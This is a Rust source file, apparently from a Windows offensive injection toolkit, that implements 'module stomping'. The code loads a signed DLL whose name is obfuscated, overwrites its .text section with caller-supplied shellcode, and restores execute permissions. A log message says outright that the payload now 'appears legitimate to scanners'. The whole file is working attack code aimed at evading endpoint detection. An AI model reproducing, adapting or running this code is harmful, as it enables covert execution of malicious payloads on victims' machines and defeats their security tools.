use crate::injection::InjectionResult;
use crate::log::LogSink;

pub fn victim_dll() -> String {
    crate::obf::s(crate::obf::XPS_DLL)
}

#[cfg(windows)]
pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, String> {
    use std::ffi::CString;
    use crate::resolve;

    const DONT_RESOLVE_DLL_REFERENCES: u32 = 0x0000_0001;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;

    let victim = victim_dll();
    let dll_name = CString::new(victim.as_str())
        .map_err(|_| "invalid DLL name".to_string())?;

    log.step("[1/5] LoadLibraryExA(victim, DONT_RESOLVE_DLL_REFERENCES)".to_string());
    let module = unsafe {
        resolve::LoadLibraryExA(
            dll_name.as_ptr() as *const u8,
            std::ptr::null_mut(),
            DONT_RESOLVE_DLL_REFERENCES,
        )
    };
    if module.is_null() {
        return Err("LoadLibraryExA(victim) failed".to_string());
    }
    let base = module as *const u8;
    log.detail(format!("  Module base: 0x{:016X}", base as usize));

    log.step("[2/5] Parse PE → find .text section".to_string());
    let text = crate::pe::find_text_section(base)?;
    log.detail(format!(
        "  .text at 0x{:016X}, size {} bytes",
        text.base, text.size
    ));

    if shellcode.len() > text.size {
        return Err(format!(
            "shellcode ({} bytes) exceeds .text section ({} bytes)",
            shellcode.len(),
            text.size
        ));
    }

    log.step(format!(
        "[3/5] VirtualProtect(.text, PAGE_READWRITE) — {} bytes",
        text.size
    ));
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            text.base as *const std::ffi::c_void,
            text.size,
            PAGE_READWRITE,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect(RW) failed".to_string());
    }

    log.step(format!(
        "[4/5] Overwrite .text with {} bytes of shellcode",
        shellcode.len()
    ));
    unsafe {
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            text.base as *mut u8,
            shellcode.len(),
        );
    }

    log.step("[5/5] VirtualProtect(.text, PAGE_EXECUTE_READ)".to_string());
    let ok = unsafe {
        resolve::VirtualProtect(
            text.base as *const std::ffi::c_void,
            text.size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect(RX) failed".to_string());
    }

    log.info(format!(
        "  ✓ Module stomped: shellcode at 0x{:016X} inside victim .text",
        text.base
    ));
    log.warning(
        "  Memory is now backed by a signed DLL — appears legitimate to scanners".to_string(),
    );

    Ok(InjectionResult {
        remote_base: text.base as u64,
        size: shellcode.len(),
    })
}

#[cfg(not(windows))]
pub fn live_inject(_shellcode: &[u8], _log: &LogSink) -> Result<InjectionResult, String> {
    Err("module stomping is only available on Windows".to_string())
}
